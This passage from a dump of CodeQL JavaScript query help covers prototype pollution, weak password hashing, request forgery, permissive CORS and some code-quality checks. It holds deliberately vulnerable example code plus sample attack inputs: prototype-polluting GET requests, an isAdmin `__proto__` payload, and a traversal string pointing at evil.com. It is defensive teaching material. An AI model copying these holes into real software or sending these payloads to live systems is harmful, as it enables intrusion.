        fs.writeFileSync("/tmp/script", d)
      })
    });

    ```
    Other parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.


    ## References
    * OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).
    * OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).
    * Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).
    * Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-915/PrototypePollutingAssignment.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-915/PrototypePollutingAssignment.bqrs
  metadata:
    name: Prototype-polluting assignment
    description: |-
      Modifying an object obtained via a user-controlled property name may
                    lead to accidental mutation of the built-in Object prototype,
                    and possibly escalate to remote code execution or cross-site scripting.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: high
    id: js/prototype-polluting-assignment
    tags: |-
      security
             external/cwe/cwe-078
             external/cwe/cwe-079
             external/cwe/cwe-094
             external/cwe/cwe-400
             external/cwe/cwe-471
             external/cwe/cwe-915
  queryHelp: |
    # Prototype-polluting assignment
    Most JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype` object, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.

    One way to cause prototype pollution is by modifying an object obtained via a user-controlled property name. Most objects have a special `__proto__` property that refers to `Object.prototype`. An attacker can abuse this special property to trick the application into performing unintended modifications of `Object.prototype`.


    ## Recommendation
    Use an associative data structure that is resilient to untrusted key values, such as a [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map). In some cases, a prototype-less object created with [Object.create(null)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/create) may be preferable.

    Alternatively, restrict the computed property name so it can't clash with a built-in property, either by prefixing it with a constant string, or by rejecting inputs that don't conform to the expected format.


    ## Example
    In the example below, the untrusted value `req.params.id` is used as the property name `req.session.todos[id]`. If a malicious user passes in the ID value `__proto__`, the variable `items` will then refer to `Object.prototype`. Finally, the modification of `items` then allows the attacker to inject arbitrary properties onto `Object.prototype`.


    ```javascript
    let express = require('express');
    let app = express()

    app.put('/todos/:id', (req, res) => {
        let id = req.params.id;
        let items = req.session.todos[id];
        if (!items) {
            items = req.session.todos[id] = {};
        }
        items[req.query.name] = req.query.text;
        res.end(200);
    });

    ```
    One way to fix this is to use [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map) objects to associate key/value pairs instead of regular objects, as shown below:


    ```javascript
    let express = require('express');
    let app = express()

    app.put('/todos/:id', (req, res) => {
        let id = req.params.id;
        let items = req.session.todos.get(id);
        if (!items) {
            items = new Map();
            req.sessions.todos.set(id, items);
        }
        items.set(req.query.name, req.query.text);
        res.end(200);
    });

    ```
    Another way to fix it is to prevent the `__proto__` property from being used as a key, as shown below:


    ```javascript
    let express = require('express');
    let app = express()

    app.put('/todos/:id', (req, res) => {
        let id = req.params.id;
        if (id === '__proto__' || id === 'constructor' || id === 'prototype') {
            res.end(403);
            return;
        }
        let items = req.session.todos[id];
        if (!items) {
            items = req.session.todos[id] = {};
        }
        items[req.query.name] = req.query.text;
        res.end(200);
    });

    ```

    ## References
    * MDN: [Object.prototype.__proto__](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto)
    * MDN: [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map)
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
    * Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).
    * Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-915/PrototypePollutingFunction.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-915/PrototypePollutingFunction.bqrs
  metadata:
    name: Prototype-polluting function
    description: |-
      Functions recursively assigning properties on objects may be
                    the cause of accidental modification of a built-in prototype object.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: high
    id: js/prototype-pollution-utility
    tags: |-
      security
             external/cwe/cwe-078
             external/cwe/cwe-079
             external/cwe/cwe-094
             external/cwe/cwe-400
             external/cwe/cwe-471
             external/cwe/cwe-915
  queryHelp: |
    # Prototype-polluting function
    Most JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype`, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.

    One way to cause prototype pollution is through use of an unsafe *merge* or *extend* function to recursively copy properties from one object to another, or through the use of a *deep assignment* function to assign to an unverified chain of property names. Such a function has the potential to modify any object reachable from the destination object, and the built-in `Object.prototype` is usually reachable through the special properties `__proto__` and `constructor.prototype`.


    ## Recommendation
    The most effective place to guard against this is in the function that performs the recursive copy or deep assignment.

    Only merge or assign a property recursively when it is an own property of the *destination* object. Alternatively, block the property names `__proto__` and `constructor` from being merged or assigned to.


    ## Example
    This function recursively copies properties from `src` to `dst`:


    ```javascript
    function merge(dst, src) {
        for (let key in src) {
            if (!src.hasOwnProperty(key)) continue;
            if (isObject(dst[key])) {
                merge(dst[key], src[key]);
            } else {
                dst[key] = src[key];
            }
        }
    }

    ```
    However, if `src` is the object `{"__proto__": {"isAdmin": true}}`, it will inject the property `isAdmin: true` in `Object.prototype`.

    The issue can be fixed by ensuring that only own properties of the destination object are merged recursively:


    ```javascript
    function merge(dst, src) {
        for (let key in src) {
            if (!src.hasOwnProperty(key)) continue;
            if (dst.hasOwnProperty(key) && isObject(dst[key])) {
                merge(dst[key], src[key]);
            } else {
                dst[key] = src[key];
            }
        }
    }

    ```
    Alternatively, block the `__proto__` and `constructor` properties:


    ```javascript
    function merge(dst, src) {
        for (let key in src) {
            if (!src.hasOwnProperty(key)) continue;
            if (key === "__proto__" || key === "constructor") continue;
            if (isObject(dst[key])) {
                merge(dst[key], src[key]);
            } else {
                dst[key] = src[key];
            }
        }
    }

    ```

    ## References
    * Prototype pollution attacks: [lodash](https://hackerone.com/reports/380873), [jQuery](https://hackerone.com/reports/454365), [extend](https://hackerone.com/reports/381185), [just-extend](https://hackerone.com/reports/430291), [merge.recursive](https://hackerone.com/reports/381194).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
    * Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).
    * Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-915/PrototypePollutingMergeCall.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-915/PrototypePollutingMergeCall.bqrs
  metadata:
    name: Prototype-polluting merge call
    description: |-
      Recursively merging a user-controlled object into another object
                    can allow an attacker to modify the built-in Object prototype,
                    and possibly escalate to remote code execution or cross-site scripting.
    kind: path-problem
    problem.severity: error
    security-severity: 6.1
    precision: high
    id: js/prototype-pollution
    tags: |-
      security
             external/cwe/cwe-078
             external/cwe/cwe-079
             external/cwe/cwe-094
             external/cwe/cwe-400
             external/cwe/cwe-471
             external/cwe/cwe-915
  queryHelp: |
    # Prototype-polluting merge call
    Most JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype`, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.

    One way to cause prototype pollution is through use of an unsafe *merge* or *extend* function to recursively copy properties from an untrusted source object. Such a call can modify any object reachable from the destination object, and the built-in `Object.prototype` is usually reachable through the special properties `__proto__` and `constructor.prototype`. An attacker can abuse this by sending an object with these property names and thereby modify `Object.prototype`.


    ## Recommendation
    Update your library dependencies in order to use a safe version of the *merge* or *extend* function. If your library has no fixed version, switch to another library.


    ## Example
    In the example below, the untrusted value `req.query.prefs` is parsed as JSON and then copied into a new object:


    ```javascript
    app.get('/news', (req, res) => {
      let prefs = lodash.merge({}, JSON.parse(req.query.prefs));
    })

    ```
    Prior to lodash 4.17.11 this would be vulnerable to prototype pollution. An attacker could send the following GET request:

    ```
    GET /news?prefs={"constructor":{"prototype":{"xxx":true}}}
    ```
    This causes the `xxx` property to be injected on `Object.prototype`. Fix this by updating the lodash version:


    ```json
    {
      "dependencies": {
        "lodash": "^4.17.12"
      }
    }

    ```
    Note that some web frameworks, such as Express, parse query parameters using extended URL-encoding by default. When this is the case, the application may be vulnerable even if not using `JSON.parse`. The example below would also be susceptible to prototype pollution:


    ```javascript
    app.get('/news', (req, res) => {
      let config = lodash.merge({}, {
        prefs: req.query.prefs
      });
    })

    ```
    In the above example, an attacker can cause prototype pollution by sending the following GET request:

    ```
    GET /news?prefs[constructor][prototype][xxx]=true
    ```

    ## References
    * Prototype pollution attacks: [lodash](https://hackerone.com/reports/380873), [jQuery](https://hackerone.com/reports/454365), [extend](https://hackerone.com/reports/381185), [just-extend](https://hackerone.com/reports/430291), [merge.recursive](https://hackerone.com/reports/381194).
    * Express: [urlencoded()](https://expressjs.com/en/api.html#express.urlencoded)
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
    * Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).
    * Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-916/InsufficientPasswordHash.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-916/InsufficientPasswordHash.bqrs
  metadata:
    name: Use of password hash with insufficient computational effort
    description: Creating a hash of a password with low computational effort makes
      the hash vulnerable to password cracking attacks.
    kind: path-problem
    problem.severity: warning
    security-severity: 8.1
    precision: high
    id: js/insufficient-password-hash
    tags: |-
      security
             external/cwe/cwe-916
  queryHelp: |
    # Use of password hash with insufficient computational effort
    Storing cryptographic hashes of passwords is standard security practice, but it is equally important to select the right hashing scheme. If an attacker obtains the hashed passwords of an application, the password hashing scheme should still prevent the attacker from easily obtaining the original cleartext passwords.

    A good password hashing scheme requires a computation that cannot be done efficiently. Standard hashing schemes, such as `md5` or `sha1`, are efficiently computable, and are therefore not suitable for password hashing.


    ## Recommendation
    Use a secure password hashing scheme such as `bcrypt`, `scrypt`, `PBKDF2`, or `Argon2`.


    ## Example
    In the example below, the `md5` algorithm computes the hash of a password.


    ```javascript
    const crypto = require("crypto");
    function hashPassword(password) {
        var hasher = crypto.createHash('md5');
        var hashed = hasher.update(password).digest("hex"); // BAD
        return hashed;
    }

    ```
    This is not secure, since the password can be efficiently cracked by an attacker that obtains the hash. A more secure scheme is to hash the password with the `bcrypt` algorithm:


    ```javascript
    const bcrypt = require("bcrypt");
    function hashPassword(password, salt) {
      var hashed = bcrypt.hashSync(password, salt); // GOOD
      return hashed;
    }

    ```

    ## References
    * OWASP: [Password storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html).
    * Common Weakness Enumeration: [CWE-916](https://cwe.mitre.org/data/definitions/916.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-918/ClientSideRequestForgery.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-918/ClientSideRequestForgery.bqrs
  metadata:
    name: Client-side request forgery
    description: |-
      Making a client-to-server request with user-controlled data in the URL allows a request forgery attack
                    against the client.
    kind: path-problem
    problem.severity: error
    security-severity: 5.0
    precision: medium
    id: js/client-side-request-forgery
    tags: |-
      security
             external/cwe/cwe-918
  queryHelp: |
    # Client-side request forgery
    Directly incorporating user input in the URL of an outgoing HTTP request can enable a request forgery attack, in which the request is altered to target an unintended API endpoint or resource. A client-side forged request may perform an unwanted action affecting the victim's account, or may lead to cross-site scripting if the request response is handled in an unsafe way. This is different from CSRF (cross-site request forgery), and will usually bypass CSRF protections. This is usually less severe than SSRF (server-side request forgery), as it does not expose internal services.


    ## Recommendation
    Restrict user inputs in the URL of an outgoing request, in particular:

    * Avoid user input in the hostname of the URL. Pick the hostname from an allow-list instead of constructing it directly from user input.
    * Take care when user input is part of the pathname of the URL. Restrict the input so that path traversal ("`../`") cannot be used to redirect the request to an unintended endpoint.

    ## Example
    The following example shows an HTTP request used to fetch the pre-rendered HTML body of a message. It is using the endpoint `/api/messages/ID`, which is believed to respond with a safe HTML string, to be embedded in the page:


    ```javascript
    async function loadMessage() {
        const query = new URLSearchParams(location.search);
        const url = '/api/messages/' + query.get('message_id');
        const data = await (await fetch(url)).json();
        document.getElementById('message').innerHTML = data.html;
    }

    ```
    However, the format of the message ID is not checked, and an attacker can abuse this to alter the endpoint targeted by the request. If they can redirect it to an endpoint that returns an untrusted value, this leads to cross-site scripting.

    For example, given the query string `message_id=../pastebin/123`, the request will end up targeting the `/api/pastebin` endpoint. Or if there is an open redirect on the login page, a query string like `message_id=../../login?redirect_url=https://evil.com` could give the attacker full control over the response as well.

    In example below, the input has been restricted to a number so that the endpoint cannot be altered:


    ```javascript
    async function loadMessage() {
        const query = new URLSearchParams(location.search);
        const url = '/api/messages/' + Number(query.get('message_id'));
        const data = await (await fetch(url)).json();
        document.getElementById('message').innerHTML = data.html;
    }

    ```

    ## References
    * OWASP: [Server-side request forgery](https://cwe.mitre.org/data/definitions/918.html)
    * OWASP: [Cross-site request forgery](https://cwe.mitre.org/data/definitions/352.html)
    * Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-918/RequestForgery.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-918/RequestForgery.bqrs
  metadata:
    name: Server-side request forgery
    description: Making a network request with user-controlled data in the URL allows
      for request forgery attacks.
    kind: path-problem
    problem.severity: error
    security-severity: 9.1
    precision: high
    id: js/request-forgery
    tags: |-
      security
             external/cwe/cwe-918
  queryHelp: |
    # Server-side request forgery
    Directly incorporating user input in the URL of an outgoing HTTP request can enable a request forgery attack, in which the request is altered to target an unintended API endpoint or resource. If the server performing the request is connected to an internal network, this can give an attacker the means to bypass the network boundary and make requests against internal services. A forged request may perform an unintended action on behalf of the attacker, or cause information leak if redirected to an external server or if the request response is fed back to the user. It may also compromise the server making the request, if the request response is handled in an unsafe way.


    ## Recommendation
    Restrict user inputs in the URL of an outgoing request, in particular:

    * Avoid user input in the hostname of the URL. Pick the hostname from an allow-list instead of constructing it directly from user input.
    * Take care when user input is part of the pathname of the URL. Restrict the input so that path traversal ("`../`") cannot be used to redirect the request to an unintended endpoint.

    ## Example
    The following example shows an HTTP request parameter being used directly in the URL of a request without validating the input, which facilitates an SSRF attack. The request `http.get(...)` is vulnerable since attackers can choose the value of `target` to be anything they want. For instance, the attacker can choose `"internal.example.com/#"` as the target, causing the URL used in the request to be `"https://internal.example.com/#.example.com/data"`.

    A request to `https://internal.example.com` may be problematic if that server is not meant to be directly accessible from the attacker's machine.


    ```javascript
    import http from 'http';

    const server = http.createServer(function(req, res) {
        const target = new URL(req.url, "http://example.com").searchParams.get("target");

        // BAD: `target` is controlled by the attacker
        http.get('https://' + target + ".example.com/data/", res => {
            // process request response ...
        });

    });

    ```
    One way to remedy the problem is to use the user input to select a known fixed string before performing the request:


    ```javascript
    import http from 'http';

    const server = http.createServer(function(req, res) {
        const target = new URL(req.url, "http://example.com").searchParams.get("target");

        let subdomain;
        if (target === 'EU') {
            subdomain = "europe"
        } else {
            subdomain = "world"
        }

        // GOOD: `subdomain` is controlled by the server
        http.get('https://' + subdomain + ".example.com/data/", res => {
            // process request response ...
        });

    });

    ```

    ## References
    * OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
    * Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-942/CorsPermissiveConfiguration.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-942/CorsPermissiveConfiguration.bqrs
  metadata:
    name: Permissive CORS configuration
    description: Cross-origin resource sharing (CORS) policy allows overly broad access.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.0
    precision: high
    id: js/cors-permissive-configuration
    tags: |-
      security
             external/cwe/cwe-942
  queryHelp: |
    # Permissive CORS configuration
    A server can use CORS (Cross-Origin Resource Sharing) to relax the restrictions imposed by the Same-Origin Policy, allowing controlled, secure cross-origin requests when necessary.

    A server with an overly permissive CORS configuration may inadvertently expose sensitive data or enable CSRF attacks, which allow attackers to trick users into performing unwanted operations on websites they're authenticated to.


    ## Recommendation
    When the `origin` is set to `true`, the server accepts requests from any origin, potentially exposing the system to CSRF attacks. Use `false` as the origin value or implement a whitelist of allowed origins instead.

    When the `origin` is set to `null`, it can be exploited by an attacker who can deceive a user into making requests from a `null` origin, often hosted within a sandboxed iframe.

    If the `origin` value is user-controlled, ensure that the data is properly sanitized and validated against a whitelist of allowed origins.


    ## Example
    In the following example, `server_1` accepts requests from any origin because the value of `origin` is set to `true`. `server_2` uses user-controlled data for the origin without validation.


    ```javascript
    import { ApolloServer } from 'apollo-server';
    var https = require('https'),
        url = require('url');

    var server = https.createServer(function () { });

    server.on('request', function (req, res) {
        // BAD: origin is too permissive
        const server_1 = new ApolloServer({
            cors: { origin: true }
        });

        let user_origin = url.parse(req.url, true).query.origin;
        // BAD: CORS is controlled by user
        const server_2 = new ApolloServer({
            cors: { origin: user_origin }
        });
    });
    ```
    To fix these issues, `server_1` uses a restrictive CORS configuration that is not vulnerable to CSRF attacks. `server_2` properly validates user-controlled data against a whitelist before using it.


    ```javascript
    import { ApolloServer } from 'apollo-server';
    var https = require('https'),
        url = require('url');

    var server = https.createServer(function () { });

    server.on('request', function (req, res) {
        // GOOD: origin is restrictive
        const server_1 = new ApolloServer({
            cors: { origin: false }
        });

        let user_origin = url.parse(req.url, true).query.origin;
        // GOOD: user data is properly sanitized
        const server_2 = new ApolloServer({
            cors: { origin: (user_origin === "https://allowed1.com" || user_origin === "https://allowed2.com") ? user_origin : false }
        });
    });
    ```

    ## References
    * Mozilla Developer Network: [CORS, Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin).
    * W3C: [CORS for developers, Advice for Resource Owners](https://w3c.github.io/webappsec-cors-for-developers/#resources).
    * Common Weakness Enumeration: [CWE-942](https://cwe.mitre.org/data/definitions/942.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Statements/DanglingElse.ql
  relativeBqrsPath: codeql/javascript-queries/Statements/DanglingElse.bqrs
  metadata:
    name: Misleading indentation of dangling 'else'
    description: The 'else' clause of an 'if' statement should be aligned with the
      'if' it belongs to.
    kind: problem
    problem.severity: warning
    id: js/misleading-indentation-of-dangling-else
    tags: |-
      quality
             maintainability
             readability
             statistical
             non-attributable
             external/cwe/cwe-483
    precision: very-high
  queryHelp: "# Misleading indentation of dangling 'else'\nIn JavaScript, an `else`\
    \ clause is always associated with the closest preceding `if` statement that does\
    \ not already have an `else` clause. It is good practice to use indentation to\
    \ clarify this structure by indenting matching `if` ... `else` pairs by the same\
    \ amount of whitespace.\n\nIndenting the `else` clause of a nested `if` statement\
    \ to suggest that it matches an outer `if` statement (instead of the one it actually\
    \ belongs to) is confusing to readers and may even indicate a bug in the program\
    \ logic.\n\n\n## Recommendation\nEnsure that matching `if` ... `else` pairs are\
    \ indented accordingly.\n\n\n## Example\nIn the following example, the `else`\
    \ on line 5 belongs to the `if` on line 3, while its indentation wrongly suggests\
    \ that it belongs to the `if` on line 2.\n\n\n```javascript\nfunction f() {\n\t\
    if (cond1())\n\t\tif (cond2())\n\t\t\treturn 23;\n\telse\n\t\treturn 42;\n\treturn\
    \ 56;\n}\n\n```\nTo correct this issue, indent the `else` on line 5 further:\n\
    \n\n```javascript\nfunction f() {\n\tif (cond1())\n\t\tif (cond2())\n\t\t\treturn\
    \ 23;\n\t\telse\n\t\t\treturn 42;\n\treturn 56;\n}\n\n```\nConfusion about which\
    \ `if` belongs to which `else` can also be avoided by always enclosing the branches\
    \ of an `if` statement in curly braces:\n\n\n```javascript\nfunction f() {\n\t\
    if (cond1()) {\n\t\tif (cond2()) {\n\t\t\treturn 23;\n\t\t} else {\n\t\t\treturn\
    \ 42;\n\t\t}\n\t}\n\treturn 56;\n}\n\n```\n\n## References\n* Wikipedia: [Dangling\
    \ else](http://en.wikipedia.org/wiki/Dangling_else).\n* Common Weakness Enumeration:\
    \ [CWE-483](https://cwe.mitre.org/data/definitions/483.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Statements/IgnoreArrayResult.ql
  relativeBqrsPath: codeql/javascript-queries/Statements/IgnoreArrayResult.bqrs
  metadata:
    name: Ignoring result from pure array method
    description: Ignoring the result of an array method that does not modify its receiver
      is generally an error.
    kind: problem
    problem.severity: warning
    id: js/ignore-array-result
    tags: |-
      quality
             reliability
             correctness
    precision: high
  queryHelp: "# Ignoring result from pure array method\nThe `concat`, `join` and `slice`\
    \ methods are pure and do not modify any of the inputs or the array the method\
    \ is called on. It is therefore generally an error to ignore the return value\
    \ from a call to one of these methods.\n\n\n## Recommendation\nUse the returned\
    \ value from the calls to `concat`, `join` or `slice`.\n\n\n## Example\nA function\
    \ `extend` is defined in the following example. The function uses the `concat`\
    \ method to add elements to the `arr` array. However, the `extend` function has\
    \ no effect as the return value from `concat` is ignored:\n\n\n```javascript\n\
    var arr = [1,2,3];\n\nfunction extend(others) {\n\tarr.concat(others);\n}\n```\n\
    Assigning the returned value from the call to `concat` to the `arr` variable fixes\
    \ the error:\n\n\n```javascript\nvar arr = [1,2,3];\n\nfunction extend(others)\
    \ {\n\tarr = arr.concat(others);\n}\n```\n\n## References\n* Mozilla Developer\
    \ Network: [Array concat](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/concat).\n\
    * Mozilla Developer Network: [Array slice](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/slice).\n\
    * Mozilla Developer Network: [Array join](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/join).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Statements/InconsistentLoopOrientation.ql
  relativeBqrsPath: codeql/javascript-queries/Statements/InconsistentLoopOrientation.bqrs
  metadata:
    name: Inconsistent direction of for loop
    description: |-
      A 'for' loop that increments its loop variable but checks it
                    against a lower bound, or decrements its loop variable but
                    checks it against an upper bound, will either stop iterating
                    immediately or keep iterating indefinitely, and is usually
                    indicative of a typo.
    kind: problem
    problem.severity: error
    id: js/inconsistent-loop-direction
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-835
    precision: very-high
  queryHelp: |
    # Inconsistent direction of for loop
    Most `for` loops either increment a variable until an upper bound is reached, or decrement a variable until a lower bound is reached. If, instead, the variable is incremented but checked against a lower bound, or decremented but checked against an upper bound, then the loop will either terminate immediately and never execute its body, or it will keep iterating indefinitely. Neither is likely to be intentional, and is most likely the result of a typo.


    ## Recommendation
    Examine the loop carefully to check whether its test expression or update expression are erroneous.


    ## Example
    In the following example, two loops are used to set all elements of an array `a` outside a range `lower`..`upper` to zero. However, the second loop contains a typo: the loop variable `i` is decremented instead of incremented, so `i` is counted downwards from `upper+1` to `0`, `-1`, `-2` and so on.


    ```javascript
    // zero out everything below index `lower`
    for (i=lower-1; i>=0; --i)
        a[i] = 0;

    // zero out everything above index `upper`
    for (i=upper+1; i<a.length; --i)
        a[i] = 0;

    ```
    To correct this issue, change the second loop to increment its loop variable instead:


    ```javascript
    // zero out everything below index `lower`
    for (i=lower-1; i>=0; --i)
        a[i] = 0;

    // zero out everything above index `upper`
    for (i=upper+1; i<a.length; ++i)
        a[i] = 0;

    ```

    ## References
    * Mozilla Developer Network: [for](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for).
    * Common Weakness Enumeration: [CWE-835](https://cwe.mitre.org/data/definitions/835.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Statements/LabelInCase.ql
  relativeBqrsPath: codeql/javascript-queries/Statements/LabelInCase.bqrs
  metadata:
    name: Non-case label in switch statement
    description: |-
      A non-case label appearing in a switch statement that is textually aligned with a case
                    label is confusing to read, or may even indicate a bug.
    kind: problem
    problem.severity: warning
    id: js/label-in-switch
    tags: |-
      quality
             reliability
             correctness
    precision: very-high
  queryHelp: "# Non-case label in switch statement\nJavaScript allows to freely mix\
    \ `case` labels and ordinary statement labels in the body of a `switch` statement.\
    \ However, this is confusing to read (especially if both kinds of labels have\
    \ the same amount of indentation), and indeed most likely the result of a typo.\n\
    \n\n## Recommendation\nExamine the statement labels to see whether they were meant\
    \ to be case labels. If not, consider wrapping them into a statement block and\
    \ indent them to set them apart visually from the case labels.\n\n\n## Example\n\
    In this example, the label `case3` is most likely a typo for `case 3` and should\
    \ be fixed.\n\n\n```javascript\nfunction f(x) {\n\tswitch (x) {\n\tcase 1:\n\t\
    case 2:\n\tcase3:\n\t\treturn true;\n\tdefault:\n\t\treturn false;\n\t}\n}\n```\n\
    \n## References\n* Ecma International, *ECMAScript Language Definition*, 5.1 Edition,\
    \ Section 12.11. ECMA, 2011.\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Statements/LoopIterationSkippedDueToShifting.ql
  relativeBqrsPath: codeql/javascript-queries/Statements/LoopIterationSkippedDueToShifting.bqrs
  metadata:
    name: Loop iteration skipped due to shifting
    description: |-
      Removing elements from an array while iterating over it can cause the loop to skip over some elements,
                    unless the loop index is decremented accordingly.
    kind: problem
    problem.severity: warning
    id: js/loop-iteration-skipped-due-to-shifting
    tags: |-
      quality
             reliability
             correctness
    precision: high
  queryHelp: |
    # Loop iteration skipped due to shifting
    Items can be removed from an array using the `splice` method, but when doing so, all subsequent items will be shifted to a lower index. If this is done while iterating over the array, the shifting may cause the loop to skip over the element immediately after the removed element.


    ## Recommendation
    Determine what the loop is supposed to do:

    * If the intention is to remove *every occurrence* of a certain value, decrement the loop counter after removing an element, to counterbalance the shift.
    * If the loop is only intended to remove *a single value* from the array, consider adding a `break` after the `splice` call.
    * If the loop is deliberately skipping over elements, consider moving the index increment into the body of the loop, so it is clear that the loop is not a trivial array iteration loop.

    ## Example
    In this example, a function is intended to remove "`..`" parts from a path:


    ```javascript
    function removePathTraversal(path) {
      let parts = path.split('/');
      for (let i = 0; i < parts.length; ++i) {
        if (parts[i] === '..') {
          parts.splice(i, 1);
        }
      }
      return path.join('/');
    }

    ```
    However, whenever the input contain two "`..`" parts right after one another, only the first will be removed. For example, the string "`../../secret.txt`" will be mapped to "`../secret.txt`". After removing the element at index 0, the loop counter is incremented to 1, but the second "`..`" string has now been shifted down to index 0 and will therefore be skipped.

    One way to avoid this is to decrement the loop counter after removing an element from the array:


    ```javascript
    function removePathTraversal(path) {
      let parts = path.split('/');
      for (let i = 0; i < parts.length; ++i) {
        if (parts[i] === '..') {
          parts.splice(i, 1);
          --i; // adjust for array shift
        }
      }
      return path.join('/');
    }

    ```
    Alternatively, use the `filter` method:


    ```javascript
    function removePathTraversal(path) {
      return path.split('/').filter(part => part !== '..').join('/');
    }

    ```

    ## References
    * MDN: [Array.prototype.splice()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/splice).
    * MDN: [Array.prototype.filter()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/filter).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Statements/MisleadingIndentationAfterControlStmt.ql
  relativeBqrsPath: codeql/javascript-queries/Statements/MisleadingIndentationAfterControlStmt.bqrs
  metadata:
    name: Misleading indentation after control statement
    description: |-
      The body of a control statement should have appropriate indentation to clarify which
                    statements it controls and which ones it does not control.
    kind: problem
    problem.severity: warning
    id: js/misleading-indentation-after-control-statement
    tags: |-
      quality
             maintainability
             readability
             statistical
             non-attributable
             external/cwe/cwe-483
    precision: very-high
  queryHelp: "# Misleading indentation after control statement\nLoop bodies and the\
    \ 'then' and 'else' branches of `if` statements can either be block statements\
    \ delimited by curly braces, or simple statements. In the latter case, special\
    \ care must be taken to correctly indent statements to indicate whether or not\
    \ they belong to the body of the loop or the `if` statement. In particular, the\
    \ statement immediately after the loop or `if` statement should not be indented\
    \ by the same amount as the body to avoid misunderstanding of the control flow\
    \ structure.\n\n\n## Recommendation\nUse additional indentation to set loop bodies\
    \ and then/else branches apart, but use the same amount of indentation for statements\
    \ that follow each other in a sequence of statements.\n\n\n## Example\nIn this\
    \ example, the 'then' branch of the `if` statement consists of the single statement\
